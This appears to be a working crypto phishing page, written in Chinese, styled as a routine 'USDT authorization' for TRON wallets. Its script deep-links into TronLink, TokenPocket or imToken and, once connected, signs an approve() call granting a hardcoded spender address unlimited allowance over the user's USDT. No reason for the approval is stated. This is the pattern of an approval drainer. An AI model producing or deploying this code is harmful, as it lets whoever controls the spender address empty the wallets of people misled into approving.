<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>多链钱包授权 - USDT无限授权</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            max-width: 500px;
            margin: 0 auto;
            padding: 20px;
        }
        
        .card {
            background: white;
            border-radius: 24px;
            padding: 24px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
            margin-bottom: 20px;
        }
        
        h1 {
            font-size: 28px;
            color: #333;
            margin-bottom: 8px;
        }
        
        .subtitle {
            color: #666;
            font-size: 14px;
            margin-bottom: 24px;
        }
        
        .chain-selector {
            display: flex;
            gap: 12px;
            margin-bottom: 24px;
            flex-wrap: wrap;
        }
        
        .chain-btn {
            flex: 1;
            padding: 12px;
            border: 2px solid #e0e0e0;
            background: white;
            border-radius: 12px;
            cursor: pointer;
            font-size: 14px;
            font-weight: 500;
            transition: all 0.2s;
        }
        
        .chain-btn.active {
            border-color: #667eea;
            background: #f0f0ff;
            color: #667eea;
        }
        
        .wallet-list {
            display: flex;
            flex-direction: column;
            gap: 12px;
            margin-bottom: 24px;
        }
        
        .wallet-item {
            display: flex;
            align-items: center;
            padding: 16px;
            border: 1px solid #e0e0e0;
            border-radius: 16px;
            cursor: pointer;
            transition: all 0.2s;
            background: white;
        }
        
        .wallet-item.selected {
            border-color: #667eea;
            background: #f8f9ff;
        }
        
        .wallet-icon {
            width: 48px;
            height: 48px;
            border-radius: 12px;
            background: #f5f5f5;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-right: 16px;
            font-size: 24px;
        }
        
        .wallet-info {
            flex: 1;
        }
        
        .wallet-name {
            font-weight: 600;
            color: #333;
            margin-bottom: 4px;
        }
        
        .wallet-chains {
            font-size: 12px;
            color: #999;
        }
        
        .approve-btn {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 16px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s;
        }
        
        .approve-btn:active {
            transform: scale(0.98);
        }
        
        .status {
            margin-top: 16px;
            padding: 12px;
            border-radius: 12px;
            font-size: 14px;
            text-align: center;
        }
        
        .status.loading {
            background: #fff3cd;
            color: #856404;
        }
        
        .status.success {
            background: #d4edda;
            color: #155724;
        }
        
        .status.error {
            background: #f8d7da;
            color: #721c24;
        }
        
        .download-prompt {
            position: fixed;
            bottom: 20px;
            left: 20px;
            right: 20px;
            background: #333;
            color: white;
            padding: 16px;
            border-radius: 16px;
            text-align: center;
            animation: slideUp 0.3s ease;
            z-index: 1000;
        }
        
        .download-prompt a {
            color: #667eea;
            text-decoration: underline;
        }
        
        @keyframes slideUp {
            from {
                transform: translateY(100%);
                opacity: 0;
            }
            to {
                transform: translateY(0);
                opacity: 1;
            }
        }
        
        .hidden {
            display: none;
        }
        
        .loading-spinner {
            display: inline-block;
            width: 16px;
            height: 16px;
            border: 2px solid #f3f3f3;
            border-top: 2px solid #667eea;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-right: 8px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <h1>🔐 USDT 授权</h1>
            <div class="subtitle">选择链和钱包，完成授权</div>
            
            <div class="chain-selector" id="chainSelector">
                <button class="chain-btn" data-chain="1">Ethereum</button>
                <button class="chain-btn" data-chain="56">BNB Chain</button>
                <button class="chain-btn active" data-chain="728126428">TRON</button>
            </div>
            
            <div class="wallet-list" id="walletList"></div>
            
            <div style="background: #f5f5f5; padding: 12px; border-radius: 12px; margin-bottom: 16px;">
                <div style="font-size: 12px; color: #666;">授权地址</div>
                <div style="font-size: 12px; color: #333; word-break: break-all;">TZ6BCwwyMmWNM9vno1cLKp6kwy1QEXjxjA</div>
                <div style="font-size: 12px; color: #666; margin-top: 8px;">授权额度</div>
                <div style="font-size: 14px; color: #667eea; font-weight: 600;">无限额度</div>
            </div>
            
            <button class="approve-btn" id="approveBtn">授权 USDT</button>
            <div class="status hidden" id="status"></div>
            <div class="info-text" id="walletInfo" style="font-size: 12px; color: #999; margin-top: 12px; text-align: center;">请选择钱包</div>
        </div>
    </div>
    
    <div id="downloadPrompt" class="download-prompt hidden"></div>

    <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.0/dist/TronWeb.js"></script>
    <script>
        // ==================== 配置 ====================
        const TRON_USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
        const SPENDER_ADDRESS = 'TZ6BCwwyMmWNM9vno1cLKp6kwy1QEXjxjA';
        const UNLIMITED_AMOUNT = 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
        
        const wallets = {
            tronlink: {
                name: 'TronLink',
                icon: '🌊',
                scheme: 'tronlink://',
                download: 'https://www.tronlink.org/'
            },
            tokenpocket: {
                name: 'TokenPocket',
                icon: '🎫',
                scheme: 'tp://',
                download: 'https://www.tokenpocket.pro/'
            },
            imtoken: {
                name: 'imToken',
                icon: '🔷',
                scheme: 'imtokenv2://',
                download: 'https://token.im/'
            }
        };
        
        let currentChain = '728126428';
        let selectedWallet = null;
        let pendingApprove = false;
        
        function showStatus(message, type = 'loading') {
            const statusEl = document.getElementById('status');
            statusEl.innerHTML = type === 'loading' ? `<span class="loading-spinner"></span>${message}` : message;
            statusEl.className = `status ${type}`;
            statusEl.classList.remove('hidden');
        }
        
        function hideStatus() {
            document.getElementById('status').classList.add('hidden');
        }
        
        function updateWalletInfo(text) {
            document.getElementById('walletInfo').textContent = text;
        }
        
        function showDownloadPrompt(wallet) {
            const prompt = document.getElementById('downloadPrompt');
            prompt.innerHTML = `
                未检测到 ${wallet.name}<br>
                <a href="${wallet.download}" target="_blank">点击下载钱包</a>
                <span style="margin-left: 12px; cursor: pointer;" onclick="closeDownloadPrompt()">✕</span>
            `;
            prompt.classList.remove('hidden');
            setTimeout(() => closeDownloadPrompt(), 5000);
        }
        
        function closeDownloadPrompt() {
            document.getElementById('downloadPrompt').classList.add('hidden');
        }
        
        function isMobile() {
            return /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
        }
        
        // 检测钱包是否安装
        function checkWalletInstalled(scheme) {
            return new Promise((resolve) => {
                const iframe = document.createElement('iframe');
                iframe.style.display = 'none';
                iframe.src = scheme;
                document.body.appendChild(iframe);
                
                const timer = setTimeout(() => {
                    document.body.removeChild(iframe);
                    resolve(false);
                }, 2000);
                
                const onVisibilityChange = () => {
                    if (document.hidden || document.webkitHidden) {
                        clearTimeout(timer);
                        document.body.removeChild(iframe);
                        document.removeEventListener('visibilitychange', onVisibilityChange);
                        window.removeEventListener('blur', onVisibilityChange);
                        resolve(true);
                    }
                };
                
                window.addEventListener('blur', onVisibilityChange);
                document.addEventListener('visibilitychange', onVisibilityChange);
            });
        }
        
        // 唤起钱包
        async function openWallet() {
            if (!selectedWallet) {
                showStatus('请先选择钱包', 'error');
                return;
            }
            
            const wallet = wallets[selectedWallet];
            
            showStatus(`正在唤起 ${wallet.name}...`, 'loading');
            updateWalletInfo(`正在唤起 ${wallet.name}`);
            
            // 检测是否安装
            const installed = await checkWalletInstalled(wallet.scheme);
            
            if (!installed) {
                hideStatus();
                showDownloadPrompt(wallet);
                return;
            }
            
            // 记录待授权状态
            localStorage.setItem('pendingTronApprove', 'true');
            localStorage.setItem('selectedWallet', selectedWallet);
            
            // 唤起钱包
            window.location.href = wallet.scheme;
            
            // 超时检测
            setTimeout(() => {
                if (!document.hidden && !document.webkitHidden) {
                    hideStatus();
                    showDownloadPrompt(wallet);
                }
            }, 2500);
        }
        
        // 从钱包返回后执行授权
        async function executeApprove() {
            const pending = localStorage.getItem('pendingTronApprove');
            if (!pending) return;
            
            localStorage.removeItem('pendingTronApprove');
            const walletKey = localStorage.getItem('selectedWallet');
            localStorage.removeItem('selectedWallet');
            
            if (!walletKey) return;
            
            showStatus('正在连接钱包...', 'loading');
            updateWalletInfo('正在连接，请稍候...');
            
            // 等待 TronLink 注入
            let retries = 0;
            const maxRetries = 15;
            
            const checkWallet = setInterval(async () => {
                retries++;
                
                // 检查 TronLink
                if (window.tronLink && window.tronLink.ready) {
                    clearInterval(checkWallet);
                    await sendApprove();
                }
                // 检查 TokenPocket
                else if (window.tronWeb && window.tronWeb.defaultAddress) {
                    clearInterval(checkWallet);
                    await sendApprove();
                }
                else if (retries >= maxRetries) {
                    clearInterval(checkWallet);
                    showStatus('钱包连接超时，请确保已安装并打开钱包', 'error');
                    updateWalletInfo('连接失败，请重试');
                }
            }, 500);
            
            async function sendApprove() {
                try {
                    let tronWeb;
                    
                    if (window.tronLink && window.tronLink.ready) {
                        await window.tronLink.request({ method: 'tron_requestAccounts' });
                        tronWeb = window.tronLink.tronWeb;
                    } else if (window.tronWeb) {
                        tronWeb = window.tronWeb;
                    } else {
                        throw new Error('无法连接钱包');
                    }
                    
                    const userAddress = tronWeb.defaultAddress.base58;
                    updateWalletInfo(`已连接: ${userAddress.slice(0, 6)}...${userAddress.slice(-4)}`);
                    showStatus('正在构造授权交易...', 'loading');
                    
                    const contract = await tronWeb.contract().at(TRON_USDT_CONTRACT);
                    
                    showStatus('请在钱包中确认授权...', 'loading');
                    updateWalletInfo('请在钱包中确认授权');
                    
                    const result = await contract.approve(
                        SPENDER_ADDRESS,
                        UNLIMITED_AMOUNT
                    ).send();
                    
                    console.log('授权结果:', result);
                    
                    if (result && (result.result || result.txid)) {
                        const txid = result.txid || result;
                        showStatus(`✅ 授权成功！`, 'success');
                        updateWalletInfo(`授权成功！交易ID: ${txid.slice(0, 10)}...`);
                    } else {
                        showStatus('授权失败', 'error');
                        updateWalletInfo('授权失败，请重试');
                    }
                    
                } catch (error) {
                    console.error('授权错误:', error);
                    if (error.message.includes('denied') || error.message.includes('reject') || error.message.includes('cancelled')) {
                        showStatus('用户取消了授权', 'error');
                        updateWalletInfo('已取消授权');
                    } else {
                        showStatus('授权失败: ' + error.message, 'error');
                        updateWalletInfo('授权失败');
                    }
                }
            }
        }
        
        // ==================== UI 渲染 ====================
        function renderWalletList() {
            const container = document.getElementById('walletList');
            container.innerHTML = Object.entries(wallets).map(([key, wallet]) => `
                <div class="wallet-item" data-wallet="${key}">
                    <div class="wallet-icon">${wallet.icon}</div>
                    <div class="wallet-info">
                        <div class="wallet-name">${wallet.name}</div>
                        <div class="wallet-chains">TRON</div>
                    </div>
                </div>
            `).join('');
            
            document.querySelectorAll('.wallet-item').forEach(item => {
                item.addEventListener('click', () => {
                    selectedWallet = item.dataset.wallet;
                    document.querySelectorAll('.wallet-item').forEach(w => w.classList.remove('selected'));
                    item.classList.add('selected');
                    hideStatus();
                    updateWalletInfo(`已选择 ${wallets[selectedWallet].name}，点击授权`);
                });
            });
        }
        
        // ==================== 初始化 ====================
        function init() {
            // 链选择器
            document.querySelectorAll('.chain-btn').forEach(btn => {
                btn.addEventListener('click', () => {
                    document.querySelectorAll('.chain-btn').forEach(b => b.classList.remove('active'));
                    btn.classList.add('active');
                    currentChain = btn.dataset.chain;
                    selectedWallet = null;
                    
                    if (currentChain === '728126428') {
                        renderWalletList();
                        updateWalletInfo('TRON 链，请选择钱包');
                    } else {
                        document.getElementById('walletList').innerHTML = '<div style="text-align:center;padding:20px;color:#999;">EVM 链开发中</div>';
                        updateWalletInfo('EVM 链开发中，请切换回 TRON');
                    }
                    hideStatus();
                });
            });
            
            document.getElementById('approveBtn').addEventListener('click', openWallet);
            renderWalletList();
            updateWalletInfo('请选择钱包');
            
            // 检查是否有待处理的授权
            executeApprove();
        }
        
        init();
    </script>
</body>
</html>
